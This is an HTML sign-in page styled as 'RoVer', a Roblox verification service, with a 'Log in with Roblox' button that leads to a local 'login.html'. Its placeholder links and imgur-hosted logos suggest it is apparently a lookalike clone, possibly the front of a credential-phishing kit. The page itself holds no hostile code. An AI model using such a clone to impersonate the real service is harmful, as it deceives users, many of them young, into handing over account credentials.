<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>RoVer – Sign in</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --pink: #d22486;
      --pink-hover: #b61c71;
      --text-light: #ffffff;
      --text-muted: #bbbbbb;
      --bg-dark: #1d1d1d;
      --bg-card: #111;
      --footer-bg: #0f0f0f;
      --border-color: #2a2a2a;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: "Inter", sans-serif;
      background-color: var(--bg-dark);
      color: var(--text-light);
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    /* Navbar */
    nav {
      width: 100%;
      background-color: var(--pink);
      padding: 14px 32px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .nav-left, .nav-right {
      display: flex;
      align-items: center;
      gap: 20px;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 700;
      font-size: 20px;
      color: var(--text-light);
      text-decoration: none;
    }

    .logo img {
      height: 30px;
    }

    nav a {
      color: var(--text-light);
      text-decoration: none;
      font-weight: 500;
      font-size: 15px;
      opacity: 0.9;
      transition: opacity 0.2s ease;
    }

    nav a:hover {
      opacity: 1;
    }

    .outline-btn {
      border: 1px solid #fff;
      padding: 6px 14px;
      border-radius: 6px;
      color: #fff;
      font-weight: 500;
      background: transparent;
      cursor: pointer;
      font-size: 14px;
      transition: all 0.2s ease;
    }

    .outline-btn:hover {
      background: rgba(255, 255, 255, 0.1);
    }

    .sign-btn {
      background: #fff;
      color: #000;
      border: none;
      padding: 6px 14px;
      border-radius: 6px;
      font-weight: 600;
      cursor: pointer;
      font-size: 14px;
      transition: background 0.2s ease;
    }

    .sign-btn:hover {
      background: #ddd;
    }

    /* Main section */
    main {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #1a1a1a;
      padding: 60px 20px;
    }

    .login-card {
      background: var(--bg-card);
      padding: 50px 60px;
      border-radius: 10px;
      text-align: center;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
    }

    .login-card h1 {
      font-size: 24px;
      margin-bottom: 10px;
      font-weight: 600;
    }

    .login-card p {
      color: var(--text-muted);
      font-size: 15px;
      margin-bottom: 30px;
    }

    .login-btn {
      background-color: var(--pink);
      color: #fff;
      border: none;
      border-radius: 20px;
      padding: 12px 28px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    .login-btn:hover {
      background-color: var(--pink-hover);
    }

    /* Footer */
    footer {
      background: var(--footer-bg);
      color: #ccc;
      padding: 50px 40px 40px;
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      gap: 30px;
      font-size: 14px;
    }

    .footer-left img {
      height: 28px;
      display: block;
      margin-bottom: 10px;
    }

    .footer-left p {
      color: #999;
      font-size: 13px;
      margin: 6px 0;
    }

    .footer-links {
      display: flex;
      flex-wrap: wrap;
      gap: 80px;
    }

    .footer-links div {
      display: flex;
      flex-direction: column;
      gap: 6px;
    }

    .footer-links a {
      color: #bbb;
      text-decoration: none;
      transition: color 0.2s ease;
    }

    .footer-links a:hover {
      color: #fff;
    }

    @media (max-width: 768px) {
      nav {
        flex-direction: column;
        align-items: flex-start;
        gap: 10px;
      }

      main {
        padding: 40px 20px;
      }

      .login-card {
        padding: 40px 20px;
      }

      footer {
        flex-direction: column;
        text-align: center;
        align-items: center;
      }

      .footer-links {
        gap: 40px;
        justify-content: center;
      }
    }
  </style>
</head>
<body>
  <!-- Navbar -->
  <nav>
    <div class="nav-left">
      <a href="#" class="logo">
        <img src="https://imgur.com/0ErnjPo.png" alt="RoVer Logo" />
        RoVer
      </a>
      <a href="#">Help</a>
      <a href="#">Team Members</a>
      <button class="outline-btn">RoVer Plus</button>
    </div>
    <div class="nav-right">
      <button class="outline-btn">Manage Servers</button>
      <button class="sign-btn">Sign In</button>
    </div>
  </nav>

  <!-- Main Login Section -->
  <main>
    <div class="login-card">
      <h1>Sign in to RoVer</h1>
      <p>You must be 13 years of age or older to continue.</p>
      <button class="login-btn" onclick="location.href='login.html'">Log in with Roblox</button>
    </div>
  </main>

  <!-- Footer -->
  <footer>
    <div class="footer-left">
      <img src="https://i.imgur.com/n9mHnN9.png" alt="Imaginary Menagerie Logo" />
      <p>© 2025 Imaginary Menagerie, LLC.</p>
      <a href="#" style="color:#888;font-size:12px;">attributions</a>
    </div>
    <div class="footer-links">
      <div>
        <a href="#">Team members</a>
        <a href="#">Support Discord server</a>
        <a href="#">Add RoVer to your server</a>
        <a href="#">Bot Developer API</a>
      </div>
      <div>
        <a href="#">Terms of Service</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Verify your Roblox account</a>
      </div>
    </div>
  </footer>
</body>
</html>
